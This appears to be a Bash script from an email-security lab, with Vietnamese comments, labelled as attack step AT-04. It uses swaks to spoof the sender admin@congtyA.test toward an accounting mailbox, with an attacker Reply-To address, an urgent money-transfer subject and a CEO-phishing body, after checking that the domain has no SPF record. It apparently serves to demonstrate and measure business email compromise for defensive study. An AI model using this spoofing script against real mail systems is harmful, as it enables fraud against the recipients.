#!/usr/bin/env bash
# AT-04  Gia mao dinh danh nguoi gui (Email Spoofing / BEC) - chay tren vm-atk
#   sudo bash attacks/at04-spoof-header.sh
# May tan cong KHONG he co tai khoan nao o congtyA.test, nhung khai bao:
#   MAIL FROM    : admin@congtyA.test          (envelope sender - RFC 5321)
#   Header From  : Admin <admin@congtyA.test>  (chu MUA hien thi - RFC 5322)
# roi gui thang vao hop thu ketoan@congtyB.test.
set -uo pipefail   # KHONG dung -e: 5xx/RCPT bi tu choi la KET QUA do duoc, khong phai loi script

SELF="$(readlink -f "$0")"; PROJECT="$(dirname "$(dirname "$SELF")")"
EVID=/root/evidence/atk; mkdir -p "$EVID"
LOG="$EVID/at04-spoof.log"

echo "[1] Vi tri cua ke tan cong (khong phai MTA hop le cua cong ty A, khong co tai khoan)"
ip -4 -br addr
echo "--- MX va A record cua congtyA.test (chi co 10.30.0.20 duoc phep mao danh) ---"
dig @10.30.0.10 congtyA.test MX +noall +answer
dig @10.30.0.10 mail1.congtyA.test A +noall +answer
echo "--- Cong ty A chua cong bo ban ghi SPF nao (Giai doan 1) ---"
dig @10.30.0.10 TXT congtyA.test +noall +answer

echo
echo "[2] Phat thu GIA MAO (khong AUTH, khong TLS) toi mail2.congtyB.test:25"
swaks --server mail2.congtyB.test --port 25 \
      --from  'admin@congtyA.test' \
      --to    'ketoan@congtyB.test' \
      --helo  'mail1.congtyA.test' \
      --header 'From: Admin <admin@congtyA.test>' \
      --header 'Reply-To: "Admin" <attacker@darkside.test>' \
      --header 'Subject: [KHAN] Yeu cau chuyen khoan ngay hom nay' \
      --header 'X-Lab-Mark: AT-04-SPOOF' \
      --body  "@$PROJECT/attacks/payloads/phishing-ceo.txt" 2>&1 | tee "$LOG"

echo
echo "[3] Ket luan buoc AT-04"
grep -E '250' "$LOG" | tail -3 | sed 's/^/  /'
echo
echo
